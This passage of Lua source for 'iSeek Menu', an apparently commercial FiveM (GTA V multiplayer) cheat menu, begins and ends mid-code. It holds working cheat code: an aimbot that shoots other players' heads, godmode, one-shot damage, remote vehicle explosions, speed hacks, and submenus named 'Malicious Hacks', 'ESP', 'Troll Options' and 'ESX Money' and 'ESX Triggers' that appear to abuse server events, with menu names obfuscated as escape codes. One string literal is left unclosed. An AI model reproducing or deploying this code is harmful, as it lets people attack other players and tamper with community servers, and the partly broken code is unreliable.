					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, waduyh487r64, KZjx, 0)
                end
            end

			if ou328hVeh then
                local u48y34 = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if ou328hSync then
                local u48y34 = k(1.0)
				local ped = PlayerPedId()
                local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, waduyh487r64)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			
			if ou328hNeon then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, waduyh487r64)
                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, waduyh487r64)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if LOJWDNDDNDN then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(ped)
               SetVehicleDirtLevel(vvvvvvvvvvvvvvvvvvvvvvvv, 1.0)
				else
            end
			
			if CLEAR then
								SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetOverrideWeather("CLEAR")
		end
		
					if BLIZZARD then
								SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		
					if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
		
					if EXTRASUNNY then
								SetWeatherTypePersist("EXTRASUNNY")
        SetWeatherTypeNowPersist("EXTRASUNNY")
        SetWeatherTypeNow("EXTRASUNNY")
        SetOverrideWeather("EXTRASUNNY")
		end
			
			if XMAS then
			            SetForceVehicleTrails(waduyh487r64)
            SetForcePedFootstepsTracks(waduyh487r64)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
			
            if LOJ38 then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityVisible(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end
			
			if IsControlJustReleased(0, Keys['X']) then
			ClearPedTasks(PlayerPedId())
		end
			
						if Nigubdddddd then 
			local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(PlayerPedId(-1))
			if IsControlPressed(0, 232) then
			SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
			end
				if vvvvvvvvvvvvvvvvvvvvvvvv ~= WADUI then
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fMass", 15000000.0);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fInitialDragCoeff", 10.0);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fDriveBiasFront", 0.50);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fTractionCurveMax", 4.5);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fTractionCurveMin", 4.38);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fBrakeForce", 5.00);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fEngineDamageMult", 0.50);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fSteeringLock", 65.00);
					SetVehicleHandlingFloat(vvvvvvvvvvvvvvvvvvvvvvvv, "CHandlingData", "fRollCentreHeightFront", 0.80);
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), KZjx), 36.0)
					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), KZjx), 60.0);
				end
			end

			            if dki2u3bb3333 and IsPedInAnyVehicle(PlayerPedId(-1), waduyh487r64) then
                if IsControlPressed(0, 209) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                elseif IsControlPressed(0, 210) then
                    SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                end
            end
			
            if kdwojd then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayer(Entity)
                    end
                end
            end

            if Lodjn then
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end
			
			if Nighdbddd then
			SetEntityInvincible(GetPlayerPed(-1), waduyh487r64)
			SetPlayerInvincible(PlayerId(), waduyh487r64)
			SetPedCanRagdoll(GetPlayerPed(-1), KZjx)
			ClearPedBloodDamage(GetPlayerPed(-1))
			ResetPedVisibleDamage(GetPlayerPed(-1))
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), waduyh487r64, waduyh487r64, waduyh487r64, waduyh487r64, waduyh487r64, waduyh487r64, waduyh487r64, waduyh487r64)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), KZjx)
			SetEntityCanBeDamaged(GetPlayerPed(-1), KZjx)
		else
			SetEntityInvincible(GetPlayerPed(-1), KZjx)
			SetPlayerInvincible(PlayerId(), KZjx)
			SetPedCanRagdoll(GetPlayerPed(-1), waduyh487r64)
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), KZjx, KZjx, KZjx, KZjx, KZjx, KZjx, KZjx, KZjx)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), waduyh487r64)
			SetEntityCanBeDamaged(GetPlayerPed(-1), waduyh487r64)
		end

		if discordPresence then
                    SetDiscordAppId(628637344098025482)
            
                    SetDiscordRichPresenceAsset('iSeek')
                    
            SetRichPresence('Fait Par iSeekFR | https://discord.gg/FtMs4eA')
			
                    SetDiscordRichPresenceAssetText('iSeek MENU V5 |)
                
                    SetDiscordRichPresenceAssetSmall('iSeekFR MENU')
            
                    SetDiscordRichPresenceAssetSmallText('Contacte iSeek pour acheter')
            
                end
		
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end
			
			if NOXJDSS then
                local cI = {
                    [453432689] = 1.0,
                    [3219281620] = 1.0,
                    [1593441988] = 1.0,
                    [584646201] = 1.0,
                    [2578377531] = 1.0,
                    [324215364] = 1.0,
                    [736523883] = 1.0,
                    [2024373456] = 1.0,
                    [4024951519] = 1.0,
                    [3220176749] = 1.0,
                    [961495388] = 1.0,
                    [2210333304] = 1.0,
                    [4208062921] = 1.0,
                    [2937143193] = 1.0,
                    [2634544996] = 1.0,
                    [2144741730] = 1.0,
                    [3686625920] = 1.0,
                    [487013001] = 1.0,
                    [1432025498] = 1.0,
                    [2017895192] = 1.0,
                    [3800352039] = 1.0,
                    [2640438543] = 1.0,
                    [911657153] = 1.0,
                    [100416529] = 1.0,
                    [205991906] = 1.0,
                    [177293209] = 1.0,
                    [856002082] = 1.0,
                    [2726580491] = 1.0,
                    [1305664598] = 1.0,
                    [2982836145] = 1.0,
                    [1752584910] = 1.0,
                    [1119849093] = 1.0,
                    [3218215474] = 1.0,
                    [1627465347] = 1.0,
                    [3231910285] = 1.0,
                    [-1768145561] = 1.0,
                    [3523564046] = 1.0,
                    [2132975508] = 1.0,
                    [-2066285827] = 1.0,
                    [137902532] = 1.0,
                    [2828843422] = 1.0,
                    [984333226] = 1.0,
                    [3342088282] = 1.0,
                    [1785463520] = 1.0,
                    [1672152130] = 0,
                    [1198879012] = 1.0,
                    [171789620] = 1.0,
                    [3696079510] = 1.0,
                    [1834241177] = 1.0,
                    [3675956304] = 1.0,
                    [3249783761] = 1.0,
                    [-879347409] = 1.0,
                    [4019527611] = 1.0,
                    [1649403952] = 1.0,
                    [317205821] = 1.0,
                    [125959754] = 1.0,
                    [3173288789] = 1.0
                }
                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
                    if cI[cJ] and cI[cJ] ~= 0 then
                        tv = 0
                        if GetFollowPedCamViewMode() ~= 4 then
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                tv = tv + 0.0
                            until tv >= cI[cJ]
                        else
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                if cI[cJ] > 0.0 then
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                else
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                end
                            until tv >= cI[cJ]
                        end
                    end
                end
            end

            if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, waduyh487r64) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), waduyh487r64) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, waduyh487r64), waduyh487r64, waduyh487r64, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, waduyh487r64), waduyh487r64, waduyh487r64, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), waduyh487r64) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, waduyh487r64, waduyh487r64, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, waduyh487r64, waduyh487r64, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    end)
Citizen.CreateThread(
    function()

        local currentTint = 1
        local selectedTint = 1

        Wugr4yfgb("\77\97\105\110\77\101\110\117\10", "iSeek Menu")
        di9hwdn("\83\101\108\102\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "\83\101\108\102\32\77\101\110\117\10")
		di9hwdn("PedMenu", "\83\101\108\102\77\101\110\117\10", "Ped Menu")
        di9hwdn("\79\110\108\105\110\101\80\108\97\121\101\114\115\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "Players Online: " .. #getPlayerIds())
        di9hwdn("\87\101\97\112\111\110\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "Weapon Menu")
        di9hwdn("\83\105\110\103\108\101\10\87\101\97\112\111\110\77\101\110\117\10", "\87\101\97\112\111\110\77\101\110\117\10", "\83\105\110\103\108\101\10 Weapon Spawner")
        di9hwdn("\77\97\108\105\99\105\111\117\115\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "Malicious Hacks")
		di9hwdn('LulxDJ', '\77\97\108\105\99\105\111\117\115\77\101\110\117\10', 'ESP Menu')
        di9hwdn("\86\82\80\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "VRP Options")
        di9hwdn("\69\83\88\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "ESX Options")
        di9hwdn("\69\83\88\74\111\98\77\101\110\117\10", "\69\83\88\77\101\110\117\10", "ESX Jobs")
        di9hwdn("\69\83\88\77\111\110\101\121\77\101\110\117\10", "\69\83\88\77\101\110\117\10", "ESX Money Menu")
        di9hwdn("\69\83\88\68\114\117\103\77\101\110\117\10", "\69\83\88\77\101\110\117\10", "ESX Drugs")
        di9hwdn("\86\101\104\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "Vehicle Menu")
		di9hwdn("\72\101\100\105\116\10", "\86\101\104\77\101\110\117\10", "Handling")
	    di9hwdn("\83\101\116\116\105\110\103\115\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "Settings")
        di9hwdn("\86\101\104\83\112\97\119\110\79\112\116\10", "\86\101\104\77\101\110\117\10", "Vehicle Spawn Options")
		di9hwdn('CarTypes', '\86\101\104\77\101\110\117\10', 'Vehicles')
        di9hwdn('CarTypeSelection', 'CarTypes', 'Vehicle types')
        di9hwdn('CarOptions', 'CarTypeSelection', 'Vehicle Options')
        di9hwdn('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        di9hwdn('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        di9hwdn('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
		di9hwdn("\65\73\10", "\77\97\105\110\77\101\110\117\10", "\65\73\10 Menu")
        di9hwdn("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "\79\110\108\105\110\101\80\108\97\121\101\114\115\77\101\110\117\10", "Player Options")
        di9hwdn("\84\101\108\101\112\111\114\116\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "\84\101\108\101\112\111\114\116\32\77\101\110\117\10")
        di9hwdn("\76\83\67\10", "\86\101\104\77\101\110\117\10", "Welcome To Los santos customs!")
        di9hwdn("\80\108\97\121\101\114\84\114\111\108\108\77\101\110\117\10", "\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "Troll Options")
        di9hwdn("Player\69\83\88\77\101\110\117\10", "\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "ESX Options")
        di9hwdn("Player\69\83\88\74\111\98\77\101\110\117\10", "\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "ESX Jobs")
        di9hwdn("\80\108\97\121\101\114\69\83\88\84\114\105\103\103\101\114\77\101\110\117\10", "Player\69\83\88\77\101\110\117\10", "ESX Triggers")
        di9hwdn("\66\117\108\108\101\116\71\117\110\77\101\110\117\10", "\87\101\97\112\111\110\77\101\110\117\10", "Bullets Gun Options")
        di9hwdn("\84\114\111\108\108\77\101\110\117\10", "\77\97\105\110\77\101\110\117\10", "Troll Options")
        di9hwdn("\87\101\97\112\111\110\67\117\115\116\111\109\105\122\97\116\105\111\110\10", "\87\101\97\112\111\110\77\101\110\117\10", "Weapon Cusomization Options")
        di9hwdn("\87\101\97\112\111\110\84\105\110\116\77\101\110\117\10", "\87\101\97\112\111\110\67\117\115\116\111\109\105\122\97\116\105\111\110\10", "Weapon Tints")
        di9hwdn("\86\101\104\105\99\108\101\82\97\109\77\101\110\117\10", "\80\108\97\121\101\114\84\114\111\108\108\77\101\110\117\10", "Ram Vehicles Into Player")
        di9hwdn("\69\83\88\66\111\115\115\77\101\110\117\10", "\69\83\88\77\101\110\117\10", "ESX Boss")
		di9hwdn("tunings", "\76\83\67\10", "Extrerior Tuning")
        di9hwdn("performance", "\76\83\67\10", "Performance Tuning")
        di9hwdn("\83\112\97\119\110\80\114\111\112\115\77\101\110\117\10", "\80\108\97\121\101\114\84\114\111\108\108\77\101\110\117\10", "Spawn Props On Player")
        di9hwdn("\83\105\110\103\108\101\10WepPlayer", "\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "\83\105\110\103\108\101\10 Weapon Menu")
        di9hwdn("\69\83\88\77\105\115\99\77\101\110\117\10", "\69\83\88\77\101\110\117\10", "ESX Misc")
		di9hwdn("InfoMenu", "\83\101\116\116\105\110\103\115\77\101\110\117\10", "Info")
        di9hwdn("\86\101\104\66\111\111\115\116\77\101\110\117\10", "\76\83\67\10", "Vehicle Booster")
		di9hwdn("Credits", "\83\101\116\116\105\110\103\115\77\101\110\117\10", "Credits")
for i, dA in pairs(bd) do 
                di9hwdn(dA.id, "tunings", dA.name) if dA.id == "paint" then 
                di9hwdn("primary", dA.id, "Primary Paint") 
                di9hwdn("secondary", dA.id, "Secondary Paint") 
                di9hwdn("rimpaint", dA.id, "Wheel Paint") 
                di9hwdn("classic1", "primary", "Classic Paint") 
                di9hwdn("metallic1", "primary", "Metallic Paint") 
                di9hwdn("matte1", "primary", "Matte Paint") 
                di9hwdn("metal1", "primary", "Metal Paint") 
                di9hwdn("classic2", "secondary", "Classic Paint") 
                di9hwdn("metallic2", "secondary", "Metallic Paint") 
                di9hwdn("matte2", "secondary", "Matte Paint") 
                di9hwdn("metal2", "secondary", "Metal Paint") 
                di9hwdn("classic3", "rimpaint", "Classic Paint") 
                di9hwdn("metallic3", "rimpaint", "Metallic Paint") 
                di9hwdn("matte3", "rimpaint", "Matte Paint") 
                di9hwdn("metal3", "rimpaint", "Metal Paint") 
            end 
        end
        for i, dA in pairs(be) do 
            di9hwdn(dA.id, "performance", dA.name) 
        end
    
        local SelectedPlayer
    
            while WODJAWUE do
    
                local ped = PlayerPedId() 
                local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(ped) 
                SetVehicleModKit(vvvvvvvvvvvvvvvvvvvvvvvv, 0) 
                for i, dA in pairs(bd) do
                    if Plane.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then 
                                local r, g, b = table.unpack(b9) 
                                SetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, r, g, b) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, bc) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, bc) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, bc) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, bc) 
                                b8 = KZjx 
                                ba = -1 
                                b9 = -1 
                            elseif ba == "paint" then 
                                local dB, dC, dD, dA = table.unpack(b9) 
                                SetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv, dB, dC) 
                                SetVehicleExtraColours(vvvvvvvvvvvvvvvvvvvvvvvv, dD, dA) 
                                b8 = KZjx
                                ba = -1; 
                                b9 = -1
                            else 
                                if bc == "rm" then 
                                    RemoveVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, ba) 
                                    b8 = KZjx 
                                    ba = -1 
                                    b9 = -1
                                else 
                                    SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, ba, b9, KZjx) 
                                    b8 = KZjx 
                                    ba = -1 
                                    b9 = -1 
                                end 
                            end 
                        end 
                    end
    
                    if Plane.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if IlIlIlIlIlI("Sport Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 0) 
                            elseif IlIlIlIlIlI("Muscle Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 1) 
                            elseif IlIlIlIlIlI("Lowrider Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 2) 
                            elseif IlIlIlIlIlI("SUV Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 3) 
                            elseif IlIlIlIlIlI("Offroad Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 4) 
                            elseif IlIlIlIlIlI("Tuner Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 5) 
                            elseif IlIlIlIlIlI("High End Wheels") then 
                                SetVehicleWheelType(vvvvvvvvvvvvvvvvvvvvvvvv, 7) 
                            end
                                
                            ililililil() 
                        elseif dA.id == "extra" then 
                            local dF = checkValidVehicleExtras() 
                            for i, dA in pairs(dF) do
                                if IsVehicleExtraTurnedOn(vvvvvvvvvvvvvvvvvvvvvvvv, i) then 
                                    pricestring = "Installed"
                                else 
                                    pricestring = "Not Installed"
                                end
                                if IlIlIlIlIlI(dA.menuName, pricestring) then 
                                    SetVehicleExtra(vvvvvvvvvvvvvvvvvvvvvvvv, i, IsVehicleExtraTurnedOn(vvvvvvvvvvvvvvvvvvvvvvvv, i)) 
                                end 
                            end 
    
                            ililililil() 
                        elseif dA.id == "headlight" then
                            if IlIlIlIlIlI("None") then 
                                SetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, -1) 
                            end
                            for dK, dA in pairs(bo) do 
                                tp = GetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv) 
                                if tp == dA.id and not bg then 
                                    pricetext = "Installed"
                                else 
                                    if bg and tp == dA.id then 
                                        pricetext = "Previewing"
                                    else pricetext = "Not Installed"
                                    end 
                                end
                                head = GetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv) 
                                if IlIlIlIlIlI(dA.name, pricetext) then
                                    if not bg then 
                                        bi = "headlight"
                                        bk = KZjx
                                        oldhead = GetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv) 
                                        bh = table.pack(oldhead) 
                                        SetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) 
                                        bg = waduyh487r64 
                                    elseif bg and head == dA.id then 
                                        ToggleVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, 22, waduyh487r64) 
                                        SetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) 
                                        bg = KZjx; bi = -1; bh = -1 
                                    elseif bg and head ~= dA.id then 
                                        SetVehicleHeadlightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) bg = waduyh487r64 
                                    end 
                                end 
                            end
    
                                ililililil() 
                        elseif dA.id == "neon" then
                            if IlIlIlIlIlI("None") then 
                                SetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, 255, 255, 255) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, KZjx) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, KZjx) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, KZjx) 
                                SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, KZjx) 
                            end
                            for i, dA in pairs(colors) do 
                                colorr, colorg, colorb = table.unpack(dA) 
                                r, g, b = GetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv) 
                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
                                    pricestring = "Installed"
                                else 
                                    if b8 and colorr == r and colorg == g and colorb == b then 
                                        pricestring = "Previewing"
                                    else 
                                        pricestring = "Not Installed"
                                    end 
                                end
                                if IlIlIlIlIlI(i, pricestring) then
                                    if not b8 then 
                                        ba = "neon"
                                        bc = IsVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1) 
                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv) 
                                        b9 = table.pack(oldr, oldg, oldb) 
                                        SetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, waduyh487r64) 
                                        b8 = waduyh487r64 
                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
                                        SetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, waduyh487r64)
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, waduyh487r64) 
                                        b8 = KZjx 
                                        ba = -1 
                                        b9 = -1 
                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
                                        SetVehicleNeonLightsColour(vvvvvvvvvvvvvvvvvvvvvvvv, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 0, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 1, waduyh487r64) 
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 2, waduyh487r64)
                                        SetVehicleNeonLightEnabled(vvvvvvvvvvvvvvvvvvvvvvvv, 3, waduyh487r64) 
                                        b8 = waduyh487r64 
                                    end 
                                end 
                            end
        
                            ililililil() 
                        elseif dA.id == "paint" then
                            if LDOWJDWDdddwdwdad("~r~→  ~s~Primary Paint", "primary") then 
                            elseif LDOWJDWDdddwdwdad("~r~→  ~s~Secondary Paint", "secondary") then 
                            elseif LDOWJDWDdddwdwdad("~r~→  ~s~Wheel Paint", "rimpaint") then 
                            end 
                            ililililil()
                        else 
                            local as = checkValidVehicleMods(dA.id) 
                            for dG, dH in pairs(as) do
                                if dH.menuName == "Stock" then 
                                    price = 0 
                                end
                                if dA.name == "Horns" then
                                    for dI, dJ in pairs(horns) do
                                        if dJ ==dG - 1 then 
                                            dH.menuName = dI 
                                        end 
                                    end 
                                end
                                if dH.menuName == "NULL" then 
                                    dH.menuname = "unknown"
                                end
                                if IlIlIlIlIlI(dH.menuName, price) then
                                    if not b8 then 
                                        ba = dA.id
                                        b9 = GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) 
                                        b8 = waduyh487r64
                                        if dH.data.realIndex == -1 then 
                                            bc = "rm"
                                            RemoveVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dH.data.modid) 
                                            b8 = KZjx 
                                            ba = -1 
                                            b9 = -1 
                                            bc = KZjx
                                        else 
                                            bc = KZjx 
                                            SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, dH.data.realIndex, KZjx) 
                                        end 
                                    elseif b8 and GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) == dH.data.realIndex then 
                                        b8 = KZjx 
                                        ba = -1 
                                        b9 = -1 
                                        bc = KZjx
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dH.data.modid)
                                        else 
                                            SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, dH.data.realIndex, KZjx) 
                                        end 
